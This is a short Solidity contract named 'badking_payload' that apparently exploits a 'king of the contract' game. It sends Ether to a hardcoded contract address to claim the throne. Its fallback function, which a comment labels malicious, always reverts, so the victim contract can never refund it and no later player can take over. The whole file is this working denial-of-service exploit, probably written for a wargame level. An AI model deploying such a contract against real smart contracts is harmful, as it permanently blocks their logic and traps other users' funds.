// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
contract badking_payload {
    
    

    function takeOvertheKing() public payable {
        address addr = 0x00d9D557dD5F87dF87B6bFC53eb3d783Fe2C59A7;
       // addr.call.value(1000000000000000000).gas(4000000)();
        (bool success, bytes memory test)  = addr.call.value(msg.value)("");
        require(success, "Failed to transfer the funds, aborting.");
    }
    
    fallback() external payable { //malicious fallback block the action from victim smart contract.
        revert("reverted has been triggered");
    }
}
